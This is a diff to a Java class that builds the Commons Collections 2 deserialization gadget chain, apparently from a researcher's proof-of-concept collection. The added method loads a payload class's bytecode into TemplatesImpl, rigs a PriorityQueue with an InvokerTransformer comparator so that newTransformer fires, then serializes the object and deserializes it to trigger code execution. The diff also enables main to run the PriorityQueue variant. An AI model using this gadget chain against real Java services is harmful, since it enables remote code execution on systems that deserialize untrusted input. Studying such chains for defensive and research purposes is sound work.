@@ -30,13 +30,13 @@ import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
 import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.ibatis.javassist.ClassPool;
+import org.apache.ibatis.javassist.CtClass;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.util.Base64;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
@@ -45,10 +45,10 @@ import java.util.PriorityQueue;
 
 public class CommonCollections2 {
 
-//    public static void main(String[] args) throws Exception{
-////        CC2_PriorityQueue();
+    public static void main(String[] args) throws Exception{
+        CC2_PriorityQueue();
 //        CC2_TemplatesImpl();
-//    }
+    }
 
     public static void CC2_PriorityQueue() throws Exception{
         Transformer[] fakeTransformers = new Transformer[]{
@@ -88,7 +88,34 @@ public class CommonCollections2 {
     }
 
     public static void CC2_TemplatesImpl() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(TemplatesImpl_CC2.class.getName());
+        TemplatesImpl obj = new TemplatesImpl();
+        Reflections.setFieldValue(obj, "_bytecodes", new byte[][]{clazz.toBytecode()});
+        Reflections.setFieldValue(obj, "_name", "TemplatesImpl_CC2");
+        Reflections.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
 
+        Transformer transformer = new InvokerTransformer("toString", null, null);
+        Comparator comparator = new TransformingComparator(transformer);
+        PriorityQueue queue = new PriorityQueue(2, comparator);
+
+        queue.add(1);
+        queue.add(1);
+
+        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
+
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+        System.out.println(barr);
+        System.out.println("-----------------------------------------------------------------------");
+
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object) ois.readObject();
+        System.out.println(o.toString());
     }
 
 
